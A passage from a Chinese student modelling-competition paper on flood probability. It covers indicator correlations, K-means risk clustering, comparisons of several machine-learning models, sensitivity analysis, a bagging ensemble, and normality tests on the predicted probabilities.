与洪水发生概率的相关性</strong></em> * 最大 *<em><strong>，而</strong></em> * 无效防灾、湿地损失 *<em><strong> 与洪水发生概率的相关性</strong></em> * 不大 ****。</p>\n<p>对于各指标与洪水发生的相关性的原因，本文作出以下分析：森林通过树木和植被可以有效保持土壤，减少地表径流，并且树木的根系可以固土。而当森林遭到砍伐且暴雨发生时，土壤失去固定易被冲刷，导致泥沙进入河流，削弱河道蓄水能力，导致水量激增进而增加洪水发生的概率。同时砍伐森林会降低蒸腾作用，导致削弱大量水分返回大气的效果，进而导致地表径流增加，增加洪水发生概率。淤积会减少河流、湖泊和水库的蓄水容量，同时改变河道的水流速度和流向，增加洪水发生的复杂性和频率，因此降水量较大时，水体更易溢出河道，导致洪水发生。针对气候变化，现世界范围气候变化多端，导致极端天气事件（如暴雨、飓风）频率增加，降水在短时间内过于集中，导致洪水灾害发生。同时，人口增长和城市化导致土地利用变化，如水泥地面增加减少地表渗透，加剧地表径流，且人口密度高的地区，排水系统和其他基础设施在暴雨时容易超负荷，进而增加洪水发生的概率。大坝在控制水流和调节河流水位方面至关重要，若大坝质量不佳，可能在洪水期间受损坍塌，导致严重泄洪。因此良好的河流管理（如疏浚河道、修建防洪堤坝）可以有效地预防和控制洪水，若河流管理不恰当，即难以预测灾害发生。良好的地形排水设计能够快速排除积水，进而减少洪水风险，且低洼地区和排水不通畅的区域更容易发生洪水。因此地形排水与洪水发生概率的相关性也较大。[2]</p>\n<p>针对低相关性的指标，虽然无效的防灾措施可能会增加洪水的破坏程度，但它们并不会直接增加洪水发生的概率，无效防灾主要影响的是洪水造成的损失，而不是洪水发生的本身。而湿地确实具有调节水流、减缓洪水的功能，但其影响相对于森林和河流管理可能较小，湿地损失更多影响的是水生态系统的健康和水质，而不是洪水发生的直接原因。</p>\n<h2 id=\"53建议与措施\"><a class=\"anchor\" href=\"#53建议与措施\">#</a> <em><strong>*5.3*</strong></em><em><strong>* 建议与措施 *</strong></em></h2>\n<p>结合相关文献，本文针对以下方面给出提前预防洪水的建议和措施：</p>\n<p>（1）加强森林保护和恢复：实施大规模的植树造林项目，恢复被破坏的森林，扩大森林范围，提高土壤的吸水和固土能力。同时制定并严格执行森林保护法律法规，防止非法乱砍和乱伐现象。</p>\n<p>（2）改善河流管理和治理：定期清理河道中的淤积物，保持河道的蓄水和排水能力 [1]。同时需要修建防洪堤坝、水闸等设施，并定期检查和维护，确保其在涨洪期间可以正常运行 [2]。</p>\n<p>（3）提高大坝质量和管理水平：先需要对现有的大坝进行定期检测和维护，确保其结构安全。同时采用先进的技术和材料，科学设计和建造新大坝，提高大坝的防洪能力 [2]。</p>\n<p>（4）应对气候变化：利用气象监测和数据分析技术，建立暴雨早期预警系统，及时发布洪水预警信息，提前做好预防。需要加强对气候变化对区域降水模式和洪水风险影响的研究，为防洪决策提供科学依据 [3]。</p>\n<p>（5）改善城市和农村排水系统：升级和改造城市和农村的排水系统，确保在暴雨期间能迅速排除积水 [4]。除此之外，还需要定期清理排水管道和沟渠，防止淤积和堵塞。</p>\n<p>（6）加强公众教育和应急准备：除了进行生态治理，还需要通过社区活动和媒体宣传，提高公众的防灾意识和应急响应能力。同时制定详细的洪水应急预案，并定期进行演练，确保居民在洪水来临时能够迅速、安全撤离。</p>\n<h1 id=\"六-问题二的建模与求解\"><a class=\"anchor\" href=\"#六-问题二的建模与求解\">#</a> <em><strong>* 六、问题二的建模与求解 *</strong></em></h1>\n<h2 id=\"61-问题2的分析\"><a class=\"anchor\" href=\"#61-问题2的分析\">#</a> <em><strong>*6.1*</strong></em> <em><strong>* 问题 2 的分析 *</strong></em></h2>\n<p>问题 2 要求将附件 train.csv 中的洪水发生概率进行聚类，并分析具有高、中、低风险的洪水事件的指标特征。然后选取合适的指标，计算不同指标的权重，建立不同风险的预警评价模型，最后进行模型的灵敏度分析。</p>\n<h3 id=\"611-数据预处理\"><a class=\"anchor\" href=\"#611-数据预处理\">#</a> <em><strong>*6.1.1*</strong></em> <em><strong>* 数据预处理 *</strong></em></h3>\n<p>在进行聚类分析之前，首先需要对数据进行预处理：首先检查数据中是否存在缺失值，并选择合适的方法进行填补。例如，可以使用均值填充法或者插值法填补缺失值。</p>\n<h3 id=\"612-聚类方法选择\"><a class=\"anchor\" href=\"#612-聚类方法选择\">#</a> <em><strong>*6.1.2*</strong></em> <em><strong>* 聚类方法选择 *</strong></em></h3>\n<p>选用 K 均值聚类（K-means clustering）方法对洪水发生概率进行聚类。K 均值聚类是一种非监督学习方法，通过迭代不断调整聚类中心的位置，使得每个数据点到其最近聚类中心的距离之和最小。本文使用该算法将洪水发生概率分为高、中、低三个风险等级。该算法通过迭代的方式寻找 k 个簇的划分方案，使得聚类结果对应的代价函数最小，代价函数通常定义为各个样本点到其所属簇中心点的误差平方和。该算法利用 N 维空间距离对初始聚类中心进行学习，得到最终聚类中心，步骤如下：</p>\n<p>\\1. 首先选择要将数据集分成 3 个簇，然后随机选择 3 个数据点作为初始簇中心（即为高、中、低三个风险等级）。</p>\n<p>\\2. 将每个数据点分配到距离其最近的簇中心。</p>\n<p>\\3. 根据分配的数据点更新簇中心点，即通过计算属于每个簇的数据点的平均值实现。</p>\n<p>\\4. 重复步骤 2 和 3 直至簇中心点不再发生变化。</p>\n<p>\\5. 输出 3 个簇和每个簇的中心点。</p>\n<h2 id=\"62-k-means建模实现与分析\"><a class=\"anchor\" href=\"#62-k-means建模实现与分析\">#</a> <em><strong>*6.2*</strong></em>  <em><strong>*k-means 建模实现与分析 *</strong></em></h2>\n<h3 id=\"621-模型建立\"><a class=\"anchor\" href=\"#621-模型建立\">#</a> <em><strong>*6.2.1*</strong></em> <em><strong>* 模型建立 *</strong></em></h3>\n<p>首先，我们以公式（9）计算数据点到聚类中心的距离，然后对于每个数据点，用公式（10）找到最近的聚类中心。最后重新计算每个聚类中心的位置，使其等于簇内所有数据点的均值。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps125.jpg)         (9)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps126.jpg)        (10)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps127.jpg)           (11)</p>\n<p>​\t 重复上述步骤，直到聚类中心不再发生改变，我们可以得到各风险层级聚类中心表格。</p>\n<p>表 5 各风险层级聚类中心</p>\n<table>\n<thead>\n<tr>\n<th>风险等级</th>\n<th>聚类中心</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>高风险</td>\n<td>0.56840101</td>\n</tr>\n<tr>\n<td>中风险</td>\n<td>0.50701183</td>\n</tr>\n<tr>\n<td>低风险</td>\n<td>0.44612593</td>\n</tr>\n</tbody>\n</table>\n<p>洪水发生概率更靠近哪个聚类中心则被划分为哪个聚类。例如，当洪水发生概率为 0.55 时为高风险，洪水发生概率为 0.51 时为中风险，洪水发生概率为 0.42 时为低风险。</p>\n<p>​\t我们将区分开后的 train.csv 分别保存为高风险.csv、中风险.csv 和低风险.csv 以便于后续特征分析。</p>\n<h3 id=\"622-高中低风险特征分析\"><a class=\"anchor\" href=\"#622-高中低风险特征分析\">#</a> <em><strong>*6.2.2*</strong></em> <em><strong>* 高中低风险特征分析 *</strong></em></h3>\n<p>​\t对于不同风险等级的数据，我们首先分别计算其 20 个指标的平均值和方差。然后通过式（12）进行标准化数据，即将不同量纲的数据转换到一个相同的尺度上，使其均值为 0，标准差为 1。这样可以消除不同特征之间的量纲差异，使得它们在同一尺度上进行比较。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps128.jpg)             (12)</p>\n<p>​\t据此公式，将 20<em>3</em>2 个指标的数据标准化和特征可视化于图像。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps129.jpg)</p>\n<p>图 7 不同风险类别的标准化特征平均值条形图</p>\n<p>​\t通过对图 7 的分析，我们可以知道高中险聚类中，大坝质量、河流管理两个指标的影响最大，而流域、人口得分、规划不足三个指标的影响最小。在中风险聚类中，河流管理、侵蚀、无效防灾、海洋脆弱性、湿地损失、规划不足六个指标的影响最大，而季风强度、基础设施恶化两个指标的影响最小。在低风险聚类中，河流管理、大坝质量两个指标的影响极为突出，而流域、人口得分、规划不足三个指标的影响最小。由此可以得出，洪水发生高风险地区主要受设施建设影响，而中风险地区主要受地质因素影响，低风险地区也主要受设施建设影响。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps130.jpg)</p>\n<p>图 8 不同风险类别的标准化特征方差条形图</p>\n<p>​\t通过对图 8 的分析，我们可以知道在三个聚类中，地形排水、城市化、海岸脆弱性、政策因素的不确定性和波动性都很高，而季风强度、森林砍伐、气候变化、基础设施恶化四个指标的不确定性和波动性较低，也可以看出其对于各聚类洪水发生事件都有影响，进而体现其相关性强。除以上指标外，在高风险聚类中城市化、大坝质量、流域等指标的不确定性和波动性较强，即其在高风险聚类中的相关性并不强。</p>\n<p>​\t然后，我们利用差值图，通过计算高风险和低风险类别的特征差异，来直观展示哪些特征在不同风险类别中存在显著差异，为了突出差异，我们将最后的结果均减去 0.8，以此来筛选具有显著差异的因素。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps131.jpg)           (13)</p>\n<p>​\t![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps132.jpg)</p>\n<p>图 9 高风险与低风险类别特征平均值差异条形图</p>\n<p>​\t最后我们使用热力图，通过热力图结合层次聚类，直观展示不同风险类别中各特征的表现，识别特征之间的相似性和差异性，帮助分析洪水风险的主要影响因素。对标准化后的数据进行层次聚类分析，将相似的特征聚合在一起。根据聚类结果对数据进行重新排序，以确保相似的特征相邻。使用热力图将重新排序后的数据可视化，用颜色表示数据值的大小。最终得到该不同风险与指标间的热力图。在该热力图中，颜色越淡则代表该指标与该聚类中的洪水发生相关性越弱，而颜色越浓则表示其相关性越强。因此，可以直观分析得到在 **** 高风险聚类 *<em><strong> 中，</strong></em>* 河流管理、大坝质量、湿地损失、基础设施恶化 *<em><strong> 四个指标的相关性最强，而</strong></em> * 低风险聚类 *<em><strong> 中</strong></em> * 地形排水、淤积、人口得分、流域、滑坡 *<em><strong> 等指标相关性最强，在</strong></em> * 中风险聚类 *<em><strong> 则</strong></em> * 季风强度、气候变化、基础设施恶化 **** 三个指标的相关性最强。通过以上分析也可以更好帮助我们在不同风险聚类更好制定预防措施并分析风险来源。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps133.jpg)</p>\n<p>图 10 各指标层次聚类热力图</p>\n<h3 id=\"623-建立发生洪水不同风险预警模型\"><a class=\"anchor\" href=\"#623-建立发生洪水不同风险预警模型\">#</a> <em><strong>*6.2.*</strong></em><em><strong>*3*</strong></em> <em><strong>* 建立发生洪水不同风险预警模型 *</strong></em></h3>\n<p>​\t为了建立一个有效的洪水风险预警评价模型，我们分别尝试了选取 20、问题 1 中前 15 个、前 10 个相关性最大的指标进行建模。结果显示当选取 20 个指标的情况下模型拟合程度 **** 最高 ****。故我们选取全部指标进行模型的建立。</p>\n<p>​\t为了构建洪水风险预警评价模型，我们选择了几种常见的机器学习模型，包括逻辑斯特回归、线性回归、梯度提升树、决策树和随机森林。这些模型在处理回归和分类问题时具有较好的表现，并且能够提供特征重要性分析。我们通过问题 1 中训练的模型，得出不同指标的权重，并且在本问题中增加了 **** 决策树 *<em><strong> 做法和逻辑斯特回归，使得预警模型更加的全面。并且我们定义了一个</strong></em> * MyModel**** 类，用于调用预警模型，并且以公式（14）来获取模型预测正确率（Model Score）。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps134.jpg) (14)</p>\n<p>​</p>\n<p>​\t我们通过分析建立建立的五个模型 (线性回归:linear、梯度提升树：gb_tree、决策树：ju_tree、随机森林：rf_forest，逻辑斯特回归：logistic)，以 MyModel 调用模型得出结果，最终得到模型的性能可视化结果为：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps135.jpg)</p>\n<p>图 11 各模型性能对比条形图</p>\n<p>对比这三个图，我们可以发现，线性回归模型得到的模型性能最优。</p>\n<h2 id=\"63-模型灵敏度分析\"><a class=\"anchor\" href=\"#63-模型灵敏度分析\">#</a> <em><strong>*6.3*</strong></em> <em><strong>* 模型灵敏度分析 *</strong></em></h2>\n<p>灵敏度分析的目标是评估不同模型对输入特征变化的响应程度。这一过程有助于识别哪些特征对模型的预测结果影响最大。为了深入探究线性回归、梯度提升树、决策树和随机森林四个模型的灵敏度。我们采用两种方法进行灵敏度分析：基于特征变化率的灵敏度计算和基于预测结果熵值的灵敏度计算。</p>\n<p>而逻辑斯特模型不能使用特征变化率的灵敏度计算，因为逻辑斯特模型的输出是通过对线性组合后的特征进行 Sigmoid 函数变换而得：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps136.jpg)            (15)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps137.jpg)     (16)</p>\n<p>特征变化率假设特征与目标变量之间是线性关系，但逻辑斯蒂回归是非线性的。这使得特征值的简单变化并不能直接线性地反映在输出概率的变化上，并且 Sigmoid 函数具有非线性性质，在极端值处（接近 0 或 1）变化很小，而在中间值（接近 0.5）变化较大。这意味着特征值的相同变化在不同范围内对输出概率的影响不同，导致特征变化率无法简单地反映这种非线性变化。这种非线性会导致特征变化率难以稳定地捕捉特征变化对输出的影响。</p>\n<h3 id=\"631-基于特征变化率的灵敏度计算\"><a class=\"anchor\" href=\"#631-基于特征变化率的灵敏度计算\">#</a> <em><strong>*6.3.1*</strong></em> <em><strong>* 基于特征变化率的灵敏度计算 *</strong></em></h3>\n<p>​\t基于特征变化率的灵敏度计算通过评估输入特征变化对模型预测结果的影响，来衡量每个特征对模型预测的敏感度。对每个特征逐个进行变化，从最小值逐步增加到最大值，每次变化后记录模型的预测结果的平均值。然后利用式（17）计算变化率。最后计算所有变化率的平均值，作为该特征的灵敏度度量。变化率越高代表模型的灵敏度越高，效果越好。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps138.jpg)              (17)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps139.jpg)          (18)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps140.jpg)</p>\n<p>​\t 通过公式（18）计算得到四个模型的基于特征变化率的灵敏度。</p>\n<p>​\t![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps141.jpg)     ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps142.jpg)</p>\n<p>图 12 线性回归模型属性平均变化率     图 13 递归提升树模型属性平均变化率</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps143.jpg)     ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps144.jpg)</p>\n<p>图 14 决策树模型属性平均变化率      图 15 随机森林模型属性平均变化率</p>\n<p>由上图可以看出，不同模型的特征变化率各有差异。图 12 表明在线性回归模型中，季风强度、地形排水、河流管理等特征的变化率较高，说明这些特征对模型的灵敏度较大。图 13 表明在梯度提升树模型中，季风强度和地形排水的变化率较高，其他特征的影响相对较小。图 14 表明决策树模型中，特征变化率分布较为均匀，无明显突出的特征。图 15 表明随机森林模型中整体变化率较低，说明模型对单个特征的依赖程度较低。</p>\n<h3 id=\"632-基于预测结果熵值的灵敏度计算\"><a class=\"anchor\" href=\"#632-基于预测结果熵值的灵敏度计算\">#</a> <em><strong>*6.3.2*</strong></em> <em><strong>* 基于预测结果熵值的灵敏度计算 *</strong></em></h3>\n<p>​\t基于预测结果熵值的灵敏度计算通过评估模型预测结果的分布不确定性，来衡量模型的灵敏度。熵值越高，表示模型的预测结果越不确定，灵敏度越高。我们运用公式（19）得到熵值：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps145.jpg)         (19)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps146.jpg)</p>\n<p>在图中，我们展示了五种不同模型的灵敏度（通过熵值衡量）。熵值越高，表示模型的预测结果越不确定，预测的稳定性越差；熵值越低，表示模型的预测结果越确定，模型的稳定性越高。以下是针对五个模型的具体分析：</p>\n<p>1. 线性回归模型：该模型熵值最高，接近 1.6，表示该模型的预测结果具有极高的不确定性。尽管线性回归模型简单且易于理解，但在处理复杂性较高的非线性关系时，表现不如其他模型。且高熵值意味着线性回归模型在特征变化时，预测结果的波动较大，对输入数据的变化非常敏感。</p>\n<p>2. 梯度提升树模型：该模型熵值较高但低于线性回归模型，这表明该模型在预测结果的确定性方面表现比线性回归模型稍好。梯度提升树模型通过集成多棵决策树的预测结果，可以捕捉到更复杂的特征关系，因此在稳定性上有所提升。</p>\n<p>3. 决策树模型：该模型熵值接近梯度提升树模型，但略高。这表明单棵决策树模型在处理特征变化时的稳定性相对较差，预测结果波动较大。且该模型容易过拟合，特别是在训练数据较少的情况下，熵值较高恰好反映了这点。</p>\n<p>4. 随机森林模型：该模型熵值接近 1.4，略低于梯度提升树和决策树模型。随机森林模型通过集成多棵决策树，增强了预测结果的稳定性。较低的熵值表明随机森林模型在特征变化时的预测结果相对稳定，具有较好的鲁棒性。</p>\n<p>5. 逻辑回归模型：该模型熵值与随机森林模型相近，逻辑回归模型在处理分类问题时具有较好的表现，但在特征变化率计算上存在局限性。熵值反映了逻辑回归模型在预测结果上的确定性，表现出一定的稳定性。</p>\n<p>综上，线性回归模型的预测结果不确定性最高，灵敏度也较高。梯度提升树和决策树模型的熵值稍低于线性回归模型，但仍较高，说明这些模型在处理特征变化时有较大波动。随机森林模型和逻辑回归模型的熵值较低，即这些模型的预测结果稳定性表现较好，灵敏度较低。整体而言，随机森林模型在灵敏度分析中表现最佳，具有较高的预测稳定性和确定性。因此，随机森林模型可能是处理洪水概率预测的最佳选择。</p>\n<h3 id=\"七-问题三的建模与求解\"><a class=\"anchor\" href=\"#七-问题三的建模与求解\">#</a> <strong>七、</strong><em><strong>* 问题三的建模与求解 *</strong></em></h3>\n<p><em><strong>*7.1 指标选取 *</strong></em><br />\n<em><strong>*7.1.1*</strong></em><em><strong>* 初步选取指标 *</strong></em></p>\n<p>本文基于问题 1 的结论，将 20 个指标分成三组逐步分析，最终选取拟合度最高的指标组。首先将 20 个指标全部进行考虑，再根据问题 1 的结论剔除相关性最弱的湿地损失、无效防灾两个指标，最后剔除湿地损失、无效防灾、农业实践、排水系统、规划不足、季风强度、政策因素、流域、基础设施恶化 9 个相关性不强的指标，保留剩余 11 个相关性较强的指标。本文通过以上三组指标选取重新训练已有模型，并对各模型计算测试集分数、均方误差、余弦相似度以评估模型性能。</p>\n<h3 id=\"712-基于过滤法选取关键指标\"><a class=\"anchor\" href=\"#712-基于过滤法选取关键指标\">#</a> <em><strong>*7.1.2*</strong></em> <em><strong>* 基于过滤法选取关键指标 *</strong></em></h3>\n<p>过滤法是一种特征选择的方法，用于选择对模型预测结果影响最大的特征。其主要优点是不依赖于特定的模型，通过评估各个特征与目标变量之间的统计关系来进行特征选择。该方法可以帮助我们仅从题中 20 个指标的角度挖掘分析其价值高低，从而实现特征排序和选择。<br />\n在本文中，我们基于上述方法，从 11 个相关性较强的指标中筛选出 5 个关键影响指标。这 11 个指标包括森林砍伐、淤积、滑坡、城市化、海岸脆弱性、气候变化、侵蚀、人口得分、大坝质量、河流管理、地形排水。由于森林砍伐与洪水发生概率的相关性最强，因此我们首先保留该指标，并从剩余 10 个指标中筛选出 4 个最具影响力的指标，最终选取森林砍伐、淤积、大坝质量、河流管理、地形排水这 5 个关键指标。</p>\n<p>使用这些关键指标，我们对模型进行重新训练并进行评估，以验证所选指标的有效性。</p>\n<h2 id=\"72-各模型结果分析\"><a class=\"anchor\" href=\"#72-各模型结果分析\">#</a> <em><strong>*7.2 各模型 *</strong></em><em><strong>* 结果分析 *</strong></em></h2>\n<p>以上 4 组指标选取后各模型评估结果如下表：</p>\n<table>\n<thead>\n<tr>\n<th>模型</th>\n<th>性能</th>\n<th>全选指标</th>\n<th>18 个指标</th>\n<th>11 个指标</th>\n<th>5 个指标</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>多元线性回归</td>\n<td>Model score</td>\n<td>0.844453</td>\n<td>0.740756</td>\n<td>0.374618</td>\n<td>0.181427</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.000404</td>\n<td>0.000674</td>\n<td>0.001626</td>\n<td>0.002128</td>\n<td></td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.999213</td>\n<td>0.998687</td>\n<td>0.996832</td>\n<td>0.995851</td>\n<td></td>\n</tr>\n<tr>\n<td>梯度提升树</td>\n<td>Model score</td>\n<td>0.841497</td>\n<td>0.735467</td>\n<td>0.378759</td>\n<td>0.185468</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.000412</td>\n<td>0.000652</td>\n<td>0.001615</td>\n<td>0.002117</td>\n<td></td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.999198</td>\n<td>0.999132</td>\n<td>0.996853</td>\n<td>0.995872</td>\n<td></td>\n</tr>\n<tr>\n<td>决策树</td>\n<td>Model score</td>\n<td>0.053015</td>\n<td>0.047629</td>\n<td>-0.37999</td>\n<td>0.061217</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.002462</td>\n<td>0.003184</td>\n<td>0.003587</td>\n<td>0.00244</td>\n<td></td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.995203</td>\n<td>0.994738</td>\n<td>0.993019</td>\n<td>0.995241</td>\n<td></td>\n</tr>\n<tr>\n<td>随机森林</td>\n<td>Model score</td>\n<td>0.499236</td>\n<td>0.306385</td>\n<td>0.156919</td>\n<td>0.089517</td>\n</tr>\n<tr>\n<td>均方误差</td>\n<td>0.001302</td>\n<td>0.001864</td>\n<td>0.002191</td>\n<td>0.002367</td>\n<td></td>\n</tr>\n<tr>\n<td>余弦相似度</td>\n<td>0.997467</td>\n<td>0.996748</td>\n<td>0.995727</td>\n<td>0.995385</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>表 6 各指标分组下模型的性能评估</p>\n<p>通过横向对比各个模型，我们可以发现预测的准确度随着指标的增加而增加，这表明我们需要选择所有指标作为参数才能得到最优的预测模型。而如果只能选择五个数据作为参数的话，经过实验表明，如果只能选取五个指标，那么通过滤波法选取的指标表现是最优的。</p>\n<h2 id=\"73-最终模型建立\"><a class=\"anchor\" href=\"#73-最终模型建立\">#</a> <em><strong>*7.3 最终模型建立 *</strong></em></h2>\n<p>在本文中，我们采用 Bagging (Bootstrap Aggregating) 技术来建立最终的集成学习模型。Bagging 是一种集成学习方法，通过结合多个模型的预测结果来提高模型的准确性和稳定性。</p>\n<p>Bagging 技术的基本思想是通过对数据进行有放回抽样生成多个不同的训练子集，然后在每个子集上训练一个模型，最后将所有模型的预测结果进行结合（例如通过投票或平均）来得到最终的预测结果。Bagging 的优点在于可以有效减少模型的方差，提高预测的准确性和稳定性。</p>\n<p>在实现集成模型的过程中，我们首先创建了一个包含多个模型并实现了 fit、predict 和 score 方法的类 BaggingModel。在 fit 方法中，我们通过对训练数据进行有放回抽样，生成多个数据子集，并分别在每个子集上训练一个模型。随后，在 step 方法中，我们调整各个模型的权重，使得它们的和为 1。在 predict 方法中，我们使用各个模型对测试数据进行预测，并根据调整后的权重计算最终的加权预测结果。</p>\n<p>最终我们得到了训练的最优解模型 (二十个指标) 和如果只能选取五个参数后优化的集成预测模型。</p>\n<h1 id=\"八-问题四的建模与求解\"><a class=\"anchor\" href=\"#八-问题四的建模与求解\">#</a> <em><strong>* 八、问题四的建模与求解 *</strong></em></h1>\n<h2 id=\"81-结果预测\"><a class=\"anchor\" href=\"#81-结果预测\">#</a> <em><strong>*8.1 结果预测 *</strong></em></h2>\n<p>我们采用 7.3 中建立的集成学习模型，通过对 test.csv 模型里参数的读取和预测，最终得到各个 id 的洪水发生概率，并且保存在 submit.csv 中。</p>\n<h2 id=\"82-结果可视化\"><a class=\"anchor\" href=\"#82-结果可视化\">#</a> <em><strong>*8.2*</strong></em> <em><strong>* 结果可视化 *</strong></em></h2>\n<p>本文使用 matplotlib 库绘制直方图和折线图。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps147.jpg)</p>\n<p>图 16 洪水概率预测直方图     图 17 洪水概率预测 Q-Q 图！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps148.jpg)</p>\n<p>图 18 洪水概率预测折线图</p>\n<p><em><strong>*8.3 判断洪水发生概率是否符合正态分布 *</strong></em></p>\n<p>满足正态分布的直方图呈现钟形，即中间高、两边低，且直方图左右对称，左右两侧的频数大致相等，正态分布图像只有一个峰值，数据集集中在某一个值附近。由此可见，可以通过直方图 16 初步判断洪水发生概率符合正态分布。</p>\n<p>但仅凭直方图并不能得出最终结论，因此本文结合其他方法进行综合分析。<em><strong>*8.3.*</strong></em><em><strong>*1*</strong></em> <em><strong>*Quantile-Quantile 图 *</strong></em></p>\n<p>Q-Q 图将样本数据从小到大排列，根据个数 n 计算每个数据点的理论分位数。对于正态分布，该理论分位数根据正态分布的累积分布函数计算得到，第 i 个数据点对应分位数常用方法如式（20）。计算后在图上绘制实际数据与理论分布分位数的点。如图 17 绘制了洪水概率预测 Q-Q 图，数据点偏离了对角线，特别是尾部部分，由此说明数据并不完全服从正态分布且存在重尾现象。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps149.jpg)              (20)</p>\n<h3 id=\"832-shapiro-wilk检验\"><a class=\"anchor\" href=\"#832-shapiro-wilk检验\">#</a> <em><strong>*8.3.*</strong></em><em><strong>*2*</strong></em> <em><strong>*Shapiro-Wilk 检验 *</strong></em></h3>\n<p>该方法将样本数据按从小到大排列，按排列后的顺序计算权重系数，这些系数依赖于样本大小 n 和正态分布的期望与方差，再由式（21）计算统计量 W 值，根据 W 值和样本大小 n 计算 p 值。本模型计算得到 p 值远小于 0.05，拒绝原假设，数据不服从正态分布。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps150.jpg)           (21)</p>\n<h3 id=\"833-kolmogorov-smirnov测试\"><a class=\"anchor\" href=\"#833-kolmogorov-smirnov测试\">#</a> <em><strong>*8.3.*</strong></em><em><strong>*3*</strong></em> <em><strong>*Kolmogorov-Smirnov 测试 *</strong></em></h3>\n<p>首先从每个数据点中减去平均值并除以标准差，将数据转换为均值为 0，标准差为 1 的分布，进行数据标准化。再使用 Kolmogorov-Smirnov 测试，比较该样本与正态分布的相似性。最终由式（22）返回样本分布与参考分布之间的最大差异 D，并输出 p 值即表示观察到的数据或更极端的数据在零假设下出现的概率。该模型最终预测概率的 p 值为 0.0，小于显著性水平（0.05），故认为数据不服从正态分布。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps151.jpg)          (22)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps152.jpg)      (23)</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps153.jpg)</p>\n<h3 id=\"834-anderson-darling检验\"><a class=\"anchor\" href=\"#834-anderson-darling检验\">#</a> <em><strong>*8.3.*</strong></em><em><strong>*4*</strong></em> <em><strong>*Anderson-Darling 检验 *</strong></em></h3>\n<p>该方法将样本数据从小到大排序，计算该理论分布在数据点处的累加分布函数，并计算统计量，如式（24）所示。计算所得 A2 值远大于所有显著水平对应的临界值，拒绝原假设，数据不服从正态分布。</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml23228\\wps154.jpg)(24)</p>\n<p>综上，预测洪水发生概率不服从正态分布。</p>\n<h1 id=\"九-模型分析\"><a class=\"anchor\" href=\"#九-模型分析\">#</a> <em><strong>* 九、*</strong></em><em><strong>* 模型分析 *</strong></em></h1>\n<h2 id=\"91-模型的优点\"><a class=\"anchor\" href=\"#91-模型的优点\">#</a> <em><strong>*9.1*</strong></em>  <em><strong>* 模型的优点 *</strong></em></h2>\n<p>​\t本模型具有多个显著优点。首先，模型在数据预处理阶段对附件中的数据进行了全面的清理，确保了数据的准确性和完整性。这包括处理缺失值和异常值，从而提升了模型的可靠性。其次，本文通过详细的相关性分析，使用了皮尔逊系数和斯皮尔曼相关系数来评估各指标对洪水发生概率的影响，并可视化结果，使得相关性差异一目了然。此外，梯度提升树模型在拟合优度检验中表现出色，说明其能较为准确地预测各影响指标与洪水发生概率之间的关系。本文使用多个模型（如多元线性回归、梯度提升树、随机森林等）进行对比验证，确保了模型结果的准确性和可靠性。最后，本文在建立最终洪水发生概率预测模型时采用了 Bagging 技术，提高了模型的预测精度和稳定性。</p>\n<h2 id=\"92-模型的缺点\"><a class=\"anchor\" href=\"#92-模型的缺点\">#</a> <em><strong>*9.2*</strong></em> <em><strong>* 模型的缺点 